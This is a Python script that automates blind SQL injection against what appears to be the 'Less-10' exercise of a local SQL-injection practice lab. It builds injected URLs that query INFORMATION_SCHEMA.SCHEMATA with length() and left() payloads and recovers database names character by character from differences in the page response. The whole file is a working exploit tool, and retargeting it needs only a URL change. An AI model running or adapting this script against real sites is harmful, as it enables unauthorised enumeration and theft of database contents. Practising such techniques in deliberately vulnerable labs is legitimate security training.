import requests
import string

def get_length_dbs(url, comment):
    for i in range(20,4,-1):
        r = requests.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if '#0000ff' not in r:
            return i

def send(url):
    r = requests.get(url).text
    if '#0000ff' not in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = 'http://localhost/Less-10/?id=1" and '
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload2 = ",1)," 
payload3 = ")='"
comment = '--+' 
count = 1
dbs = ""

for i in range(0,5):
    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1
